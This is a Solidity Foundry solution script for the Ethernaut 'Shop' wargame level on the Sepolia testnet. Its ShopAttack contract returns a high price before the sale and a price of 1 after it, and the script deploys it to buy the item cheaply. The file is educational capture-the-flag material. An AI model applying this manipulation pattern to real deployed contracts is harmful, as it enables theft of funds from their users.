// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Shop.sol";

/*
    Solution script for the Ethernaut Level 21: Shop

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in ShopScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Shop.s.sol:ShopScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Shop.s.sol/11155111
*/

contract ShopAttack {
    Shop target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function attack() external {
        target.buy();
    }

    /* 
        Since the Shop contract uses the msg.sender to call price on
        we can control this by returning a slightly higher price before isSold is set to true

        Moreover, since isSold is set to true *before* updating the price 
        we can now return a lower than expected price of 1
    */
    function price() external view returns (uint) {
        return target.isSold() ? 1 : 101;
    }
}

contract ShopScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0xebFDEC817ad5da1Cf8D6A837139c66356D350c02;
    Shop level21 = Shop(instance);

    function run() external {
        vm.startBroadcast();

        require(level21.price() != 1, 'price already adjusted');
        require(!level21.isSold(), 'item already sold');

        ShopAttack attacker = new ShopAttack(instance);
        attacker.attack();

        require(level21.price() == 1, 'price not adjusted');
        require(level21.isSold(), 'item not sold');

        vm.stopBroadcast();
    }
}